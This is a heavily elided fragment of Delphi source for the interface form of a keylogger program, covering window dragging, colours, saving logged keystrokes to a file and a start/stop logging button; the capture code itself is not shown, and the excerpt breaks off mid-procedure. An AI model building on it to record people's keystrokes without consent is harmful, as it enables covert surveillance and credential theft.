...
procedure TKeylogger.WMNCHitText(var Msg:TWMNCHitTest);
const Corner=5;
      OffSet=3;
begin
  inherited;
 with KeyLogger,msg do begin
...
procedure TKeylogger.SetTheColors;
begin
 ...
 keylog.Color:=cFormForeground;
 keylog.Font.Color:=cFormText;
...
begin
 Tag:=6;Left:=(Screen.Width-Width) div 2; Top:=(Screen.Height-Height) div 2;
...
procedure TKeylogger.CaptionLabelMouseDown(Sender: TObject;
...
procedure TKeylogger.CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
...
procedure TKeylogger.CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 ReleaseCapture;
...
begin
 SaveLoggedKeys.Execute;
 KeyLog.Lines.SaveToFile(SaveLoggedKeys.FileName);
end;

procedure TKeylogger.OutlookBtn1Click(Sender: TObject);
begin
 if OutlookBtn1.Caption='start logging' then
 begin
  MainForm.StartTheLogger;
  OutlookBtn1.Caption:='stop';
 end else begin
  MainForm.StopTheLogger;
